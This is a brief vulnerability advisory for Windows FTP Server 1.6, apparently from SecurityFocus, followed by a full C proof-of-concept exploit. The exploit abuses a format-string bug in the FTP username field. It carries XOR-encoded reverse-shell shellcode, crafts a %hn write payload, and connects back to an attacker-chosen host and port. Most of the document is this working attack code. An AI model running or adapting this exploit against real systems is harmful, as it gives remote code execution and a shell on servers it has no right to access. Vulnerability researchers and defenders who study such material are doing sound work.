source: http://www.securityfocus.com/bid/9385/info

It has been reported that Windows FTP Server may be prone to a remote format string vulnerability when processing a malicious request from a client. The vulnerability presents itself when the server receives a malicious request containing embedded format string specifiers from a remote client when supplying a username during FTP authentication. This could be exploit to crash the server but could also theoretically permit corruption/disclosure of memory contents and execution of arbitrary code.

Windows FTP Server versions 1.6 and prior are reported to be prone to this issue.

/*

date:           12 janv 2004
subject:        PoC exploit for Windows Ftp Server v1.6
vendor:         http://srv.nease.net
credits:        Peter Winter-Smith for the bug discovery
shellcode:      reverse shell (~ 200 bytes)
notes:          universal (doesn't rely on NT version), 2nd version of this exploit
greets:         rosecurity team
author:         mandragore, sploiting@mandragore.solidshells.com

*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <fcntl.h>
#include <unistd.h>

unsigned char sc[]={
// some padding
0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
// restore patched code in MFC42.DLL so it doesn't crash yet
0xBF,0x2B,0x38,0x40,0x5F,0x66,0xB8,0x53,0x8B,0x66,0xAB,0x47,0x66,0xB8,0x40,0xB1,0x66,0xAB,
// overoptimised reverse shell relying on offsets in the WinFTPServer.exe's IAT
0xEB,0x0F,0x8B,0x34,0x24,0x33,0xC9,0x80,0xC1,0xB7,0x80,0x36,0x96,0x46,0xE2,0xFA,
0xC3,0xE8,0xEC,0xFF,0xFF,0xFF,0xF2,0xF1,0x19,0x90,0x96,0x96,0x28,0x1A,0x06,0xD7,
0x96,0xFE,0xA5,0xA4,0x96,0x96,0xFE,0xE1,0xE5,0xA4,0xC9,0xC2,0x69,0x83,0x06,0x06,
0xD7,0x96,0x01,0x0F,0xC4,0xC4,0xC4,0xC4,0xD4,0xC4,0xD4,0xC4,0x7E,0x9D,0x96,0x96,
0x96,0xC1,0xC5,0xD7,0xC5,0xF9,0xF5,0xFD,0xF3,0xE2,0xD7,0x96,0xC1,0x69,0x80,0x69,
0x46,0x05,0xFE,0xE9,0x96,0x96,0x97,0xFE,0x94,0x96,0x96,0x14,0x1D,0x52,0xFC,0x86,
0xC6,0xC5,0x7E,0x9E,0x96,0x96,0x96,0xF5,0xF9,0xF8,0xF8,0xF3,0xF5,0xE2,0x96,0xC1,
0x69,0x80,0x69,0x46,0xFC,0x86,0xCF,0x1D,0x6A,0xC1,0x95,0x6F,0xC1,0x65,0x3D,0x1D,
0xAA,0xB2,0x50,0x91,0xD2,0xF0,0x51,0xD1,0xBA,0x97,0x97,0x1F,0xC9,0xAE,0x1F,0xC9,
0xAA,0x1F,0xC9,0xD6,0xC6,0xC6,0xC6,0xFC,0x97,0xC6,0xC6,0x7E,0x92,0x96,0x96,0x96,
0xF5,0xFB,0xF2,0x96,0xC6,0x7E,0x99,0x96,0x96,0x96,0xD5,0xE4,0xF3,0xF7,0xE2,0xF3,
0xC6,0xE4,0xF9,0xF5,0xF3,0xE5,0xE5,0xD7,0x96,0xF2,0xF1,0x37,0xA6,0x96,0x1D,0xD6,
0x9A,0x1D,0xD6,0x8A,0x1D,0x96,0x69,0xE6,0x9E,0x69,0x80,0x69,0x46};

void usage(char *argv0) {
        printf("usage: %s -d <ip_dest> [options]\n",argv0);
        printf("options:\n");
        printf(" -h ip_host for the reversed shell (default 127.0.0.1)\n");
        printf(" -p port for the reversed shell (default 80)\n\n");
        exit(1);
}

int main(int argc, char **argv) {
        struct sockaddr_in saddr;
        #define port 21
        int target=0, lhost=0x0100007f;
        int lport=80;
        int where=0x5f40382b;
        int val1=0xc283, val2=0xe2ff;
        int delta=0x11eeca8-0x11ee96c;
        char *buff;
        int s, ret, i;

        printf("[%%] winftpserv v1.6 sploit by mandragore (v2)\n");

        if (argc<2) {
                usage(argv[0]);
        }

        while((i = getopt(argc, argv, "d:h:p:"))!= EOF) {
                switch (i) {
                case 'd':
                        target=inet_addr(optarg);
                        break;
                case 'h':
                        lhost=inet_addr(optarg);
                        break;
                case 'p':
                        lport=atoi(optarg);
                        break;
                default:
                        usage(argv[0]);
                        break;
                }
        }

        if ((target==-1) || (lhost==-1))
                usage(argv[0]);

        printf("[.] if working you'll have a shell on %s:%d .\n",inet_ntoa(*(struct in_addr *)&lhost),lport);
        printf("[.] launching attack on %s..\n",inet_ntoa(*(struct in_addr *)&target));

        lport=lport ^ 0x9696;
        lport=(lport & 0xff) << 8 | lport >>8;
        memcpy(sc+17+18+0x5a,&lport,2);

        lhost=lhost ^ 0x96969696;
        memcpy(sc+17+18+0x53,&lhost,4);

        buff=(char *)malloc(4096);
        bzero(buff,4096);

        memcpy(buff,&where,4);
        strcat(buff,"xyzy");
        where+=3;
        memcpy(buff+8,&where,4);

        strncat(buff,sc,strlen(sc));

        for (i=0;i<(delta-1)/4;i++) {
                strcat(buff,"%08x");
        }

        sprintf(buff,"%s%%0%dx%%hn%%0%dx%%hn\r\n",buff,val1-strlen(sc)-((delta-1)/4)*8-4*3-7,val2-val1);

        saddr.sin_family = AF_INET;
        saddr.sin_addr.s_addr = target;
        saddr.sin_port = htons(port);

        s=socket(2,1,6);

        ret=connect(s,(struct sockaddr *)&saddr, sizeof(saddr));
        if (ret==-1) {
                perror("[-] connect()");
                exit(1);
        }

        send(s,buff,strlen(buff),0);

        recv(s,buff,1024,0);

        close(s);

        printf("[+] done.\n");

        exit(0);
}